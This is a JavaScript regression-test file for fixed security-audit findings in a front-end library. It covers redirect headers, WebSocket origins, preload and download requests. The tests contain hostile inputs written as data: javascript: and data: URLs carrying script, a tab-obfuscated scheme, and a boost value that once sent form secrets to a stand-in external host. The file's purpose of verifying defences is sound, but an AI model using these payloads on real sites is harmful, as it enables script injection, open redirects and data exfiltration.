// SPDX-License-Identifier: MIT
import {openPage} from '../../lib/security-frame.js'

// Security audit 2026-11-15 (TASK-044), fixed in TASK-046: where requests and navigations can go.
// "SEC-NN (fixed)" tests assert the safe behaviour; "safe:" tests assert behaviour that was always correct.
describe('audit: egress and navigation', function() {

    let page
    afterEach(function() { page?.close(); page = null })

    function readSync(path) {
        let xhr = new XMLHttpRequest()
        xhr.open('GET', path, false)
        xhr.send()
        return xhr.status === 200 ? xhr.responseText : null
    }

    // the extension file name depends on the naming contract in force; find the one that exists
    function extName(name) {
        let custom = (ypy.config.prefix || '').replace(/^data-/, '')
        for (let base of ['ypy-', custom]) {
            if (base && readSync(`/src/ext/${base}${name}.js`) != null) return `${base}${name}`
        }
        throw new Error('extension not found: ' + name)
    }

    // the response header name the core honours for `suffix` (Redirect, Download...), whichever prefix it uses
    function headerName(suffix) {
        let key = Object.getOwnPropertyNames(Object.getPrototypeOf(ypy)).find(k => /^__extract\w*Headers$/.test(k))
        let m = /startsWith\('([a-z]+-)'\)/i.exec(String(ypy[key]))
        return m[1].toUpperCase() + suffix
    }

    // like openPage, but the document lives at a blob: URL, so it has the real origin of the test server
    // (an srcdoc frame has an opaque origin, where no URL counts as same-origin and nothing is boosted); the
    // <base> gives relative URLs something to resolve against
    async function openRealPage({head = '', body = '', scripts = []} = {}) {
        let iframe = document.createElement('iframe')
        let tags = scripts.map(src => `<script src="${location.origin}${src}"></script>`).join('')
        let html = `<!doctype html><html><head><base href="${location.origin}/">${head}</head><body>${body}${tags}</body></html>`
        iframe.src = URL.createObjectURL(new Blob([html], {type: 'text/html'}))
        document.body.appendChild(iframe)
        await new Promise(resolve => iframe.addEventListener('load', resolve, {once: true}))
        let win = iframe.contentWindow
        await new Promise(resolve => win.setTimeout(resolve, 30))
        return {iframe, win, doc: iframe.contentDocument, close: () => { URL.revokeObjectURL(iframe.src); iframe.remove() }}
    }

    const settle = ms => new Promise(resolve => setTimeout(resolve, ms))

    describe('redirect headers', function() {

        let realLoc, blocked
        beforeEach(function() {
            setupTest(this); realLoc = ypy._loc
            blocked = []
            document.addEventListener('ypy:security:blocked', blockedListener)
        })
        afterEach(function() { document.removeEventListener('ypy:security:blocked', blockedListener); ypy._loc = realLoc; cleanupTest() })
        const blockedListener = e => blocked.push(e.detail)

        async function redirectTo(url) {
            let assigned = []
            ypy._loc = {set href(v) { assigned.push(v) }, get href() { return location.href }, reload() {}}
            mockResponse('GET', '/r', '', {headers: {[headerName('Redirect')]: url}})
            createProcessedHTML('<button ypy-get="/r">go</button>').click()
            await forRequest()
            await settle(20)
            return assigned
        }

        // SEC-05. (source build only: the location object and the header reader are private in dist/.) The redirect
        // response header used to be written to location.href as it came. A javascript: value runs in the page origin
        // (unless the page CSP forbids inline script), a data: or another origin is an open redirect; it matters when a
        // server builds the header from user input. Fixed: the value is resolved against the page and only an
        // http(s) URL on the page's own origin is followed, unless config.mode is "cors". Anything else is
        // dropped and ypy:security:blocked fires with reason "redirect".
        itSource('SEC-05 (fixed): a javascript: URL in the redirect header is dropped', async function() {
            assert.deepEqual(await redirectTo('javascript:window.__pwn=1'), [])
            assert.isUndefined(window.__pwn)
            assert.equal(blocked.length, 1)
            assert.equal(blocked[0].reason, 'redirect')
        })

        itSource('SEC-05 (fixed): so are data: URLs and a scheme hidden by tabs and line breaks', async function() {
            assert.deepEqual(await redirectTo('data:text/html,<script>alert(1)</script>'), [])
            assert.deepEqual(await redirectTo('java\tscript:alert(1)'), [])
            assert.deepEqual(await redirectTo('  javascript:alert(1)'), [])
            assert.equal(blocked.length, 3)
        })

        itSource('SEC-05 (fixed): a URL on another origin is dropped', async function() {
            assert.deepEqual(await redirectTo('https://other.example/x'), [])
            assert.deepEqual(await redirectTo('//other.example/x'), [])
            assert.equal(blocked.length, 2)
        })

        itSource('SEC-05 (fixed): another origin is followed when config.mode is "cors"', async function() {
            ypy.config.mode = 'cors'
            assert.deepEqual(await redirectTo('https://other.example/x'), ['https://other.example/x'])
            assert.deepEqual(await redirectTo('javascript:alert(1)'), [], 'but never a javascript: URL')
        })

        itSource('safe: the page\'s own origin is followed, as a path or as a full URL', async function() {
            assert.deepEqual(await redirectTo('/login?next=%2Fhome'), [location.origin + '/login?next=%2Fhome'], 'the resolved URL is assigned')
            assert.deepEqual(await redirectTo(location.origin + '/done'), [location.origin + '/done'])
            assert.equal(blocked.length, 0)
        })

    })

    describe('WebSocket connections (extension ws)', function() {

        class FakeSocket {
            static CONNECTING = 0; static OPEN = 1; static CLOSING = 2; static CLOSED = 3
            constructor(url, protocols) { this.url = url; this.readyState = 0; (FakeSocket.all ??= []).push(this) }
            addEventListener() {}
            removeEventListener() {}
            send() {}
            close() { this.readyState = 3 }
        }

        // the selector the extension queries with spells the attribute with the old prefix at this commit,
        // so try each spelling the library has used until one connects
        async function connect(url, config = '') {
            let custom = (ypy.config.prefix || '').replace(/^data-/, '')
            for (let attr of new Set(['ypy-ws:connect', `${custom}ws:connect`])) {
                page = await openRealPage({
                    head: config ? `<meta name="ypy-config" content='${config}'>` : '',
                    scripts: ['/src/ypy.js', `/src/ext/${extName('ws')}.js`]
                })
                // the extension reads WebSocket when it connects, so replace it before the element exists
                page.win.WebSocket = FakeSocket
                FakeSocket.all = []
                page.blocked = []
                page.doc.addEventListener('ypy:security:blocked', e => page.blocked.push(e.detail))
                page.doc.body.insertAdjacentHTML('afterbegin', `<div id="w" ${attr}="${url}"></div>`)
                page.win.ypy.process(page.doc.body)
                await new Promise(resolve => page.win.setTimeout(resolve, 30))
                if (FakeSocket.all.length || page.blocked.length) return FakeSocket.all.map(s => s.url)
                page.close()
            }
            return []
        }

        // SEC-06. config.mode / selfRequestsOnly pin fetch to the same origin, but the WebSocket extension opened
        // whatever URL the element named, on any origin (the page's `connect-src` was the only limit). The docs
        // call connect-src "the second lock behind selfRequestsOnly"; for WebSocket it was the only one. The
        // socket carries the messages from `ws:send` (form data) out, and what it receives is swapped into the page.
        // Fixed: a URL whose origin differs from the page's is refused unless config.mode is "cors"
        // (ypy:security:blocked, reason "websocket-origin").
        it('SEC-06 (fixed): ws:connect refuses a socket to another origin and reports it', async function() {
            assert.deepEqual(await connect('wss://other.example/feed'), [])
            assert.equal(page.blocked.length, 1)
            assert.equal(page.blocked[0].reason, 'websocket-origin')
        })

        it('SEC-06 (fixed): a protocol-relative URL to another host is refused too', async function() {
            assert.deepEqual(await connect('//other.example/feed'), [])
            assert.equal(page.blocked.length, 1)
        })

        it('SEC-06 (fixed): an http(s) URL on another origin, which the extension turns into ws(s), is refused', async function() {
            assert.deepEqual(await connect('https://other.example/feed'), [])
            assert.equal(page.blocked.length, 1)
        })

        it('safe: a socket to the page\'s own origin connects', async function() {
            let own = location.origin.replace(/^http/, 'ws') + '/feed'
            assert.deepEqual(await connect(own), [own])
            assert.equal(page.blocked.length, 0)
        })

        it('safe: config.mode "cors" lifts the pin', async function() {
            assert.deepEqual(await connect('wss://other.example/feed', 'mode:"cors"'), ['wss://other.example/feed'])
        })
    })

    describe('preload (extension preload)', function() {

        // SEC-07. The core pins the fetch mode in a hook on ypy:config:request. The preload extension builds its own
        // request context and calls fetch itself, never firing that event, so the pin was not applied: a boost
        // value such as `request.mode:"cors",request.action:"https://..."` was honoured, and the form values
        // around the link went out in the query string (the enclosing form is collected for a GET). The same
        // attribute on a normal click is pinned back to same-origin (see the "safe" test below). Needs an element
        // with a boost value the attacker wrote, which the nonce gate strips; without the gate this was a data
        // exfiltration path. Fixed: the preload request takes its mode from config.mode, as the pin does.
        const BOOST = `ypy-boost='request.mode:"cors",request.action:"https://other.example/collect"'`

        async function preloadPage(boost) {
            page = await openRealPage({scripts: ['/src/ypy.js', `/src/ext/${extName('preload')}.js`]})
            let calls = []
            page.win.fetch = async (url, init) => { calls.push({url: String(url), init}); return new page.win.Response('x') }
            page.doc.body.innerHTML = `<form><input name="secret" value="s3cret"><a id="a" href="/ok" ${boost} ypy-preload="mousedown">link</a></form><div id="out"></div>`
            page.win.ypy.process(page.doc.body)
            return calls
        }

        it('SEC-07 (fixed): the preload request is pinned to the configured mode, whatever the boost value says', async function() {
            let calls = await preloadPage(BOOST)
            page.doc.getElementById('a').dispatchEvent(new page.win.MouseEvent('mousedown', {bubbles: true}))
            await new Promise(resolve => page.win.setTimeout(resolve, 40))
            assert.equal(calls.length, 1)
            assert.equal(calls[0].init.mode, 'same-origin', 'the browser refuses a cross-origin URL in this mode, so nothing leaves')
        })

        it('SEC-07 (fixed): with the real fetch, the cross-origin preload is refused by the browser and nothing is sent', async function() {
            page = await openRealPage({scripts: ['/src/ypy.js', `/src/ext/${extName('preload')}.js`]})
            let outcome = []
            let real = page.win.fetch.bind(page.win)
            page.win.fetch = (url, init) => { let p = real(url, init); p.then(() => outcome.push('sent'), e => outcome.push(e.name)); return p }
            page.doc.body.innerHTML = `<form><input name="secret" value="s3cret"><a id="a" href="/ok" ${BOOST} ypy-preload="mousedown">link</a></form><div id="out"></div>`
            page.win.ypy.process(page.doc.body)
            page.doc.getElementById('a').dispatchEvent(new page.win.MouseEvent('mousedown', {bubbles: true}))
            await new Promise(resolve => page.win.setTimeout(resolve, 100))
            assert.deepEqual(outcome, ['TypeError'])
        })

        it('safe: a normal request from the same element is pinned back to same-origin', async function() {
            let calls = await preloadPage(`ypy-boost='request.mode:"cors"'`)
            page.doc.getElementById('a').click()
            await new Promise(resolve => page.win.setTimeout(resolve, 60))
            assert.isAtLeast(calls.length, 1)
            assert.equal(calls[calls.length - 1].init.mode, 'same-origin')
        })
    })

    describe('download header (extension download)', function() {

        // SEC-08. A response header names a second URL to download; the extension fetched it with a bare fetch(url):
        // not through the request context, so neither the same-origin mode nor the request headers applied. The
        // header is server-controlled, so this is hardening (a server that copies user input into it), but it
        // broke the documented rule that every request is same-origin. The promise was also not awaited: a failed
        // fetch was an unhandled rejection.
        // Fixed: fetch(url, {mode: config.mode, credentials: 'same-origin'}), and a failure fires ypy:error.
        it('SEC-08 (fixed): the download header makes the extension fetch with the pinned mode, and a failure is reported', async function() {
            let src = readSync(`/src/ext/${extName('download')}.js`)
            let name = /headers\.get\(['"]([A-Za-z]+-Download)['"]\)/.exec(src)[1]
            page = await openPage({body: '<button id="b" ypy-get="/d">d</button>', scripts: ['/src/ypy.js', `/src/ext/${extName('download')}.js`]})
            let calls = [], unhandled = 0, errors = []
            page.win.addEventListener('unhandledrejection', e => { unhandled++; e.preventDefault() })
            page.doc.addEventListener('ypy:error', e => errors.push(e.detail.error))
            page.win.fetch = async (url, init) => {
                calls.push({url: String(url), init})
                if (calls.length === 1) return new page.win.Response('', {headers: {[name]: 'https://other.example/file.bin'}})
                throw new TypeError('stopped by the test')
            }
            page.win.ypy.process(page.doc.body, true)
            page.doc.getElementById('b').click()
            await new Promise(resolve => page.win.setTimeout(resolve, 80))
            assert.equal(calls.length, 2)
            assert.equal(calls[1].url, 'https://other.example/file.bin')
            assert.equal(calls[1].init.mode, 'same-origin')
            assert.equal(calls[1].init.credentials, 'same-origin')
            assert.equal(unhandled, 0, 'no unhandled rejection')
            assert.equal(errors.length, 1, 'the failure is reported as ypy:error')
        })
    })
})
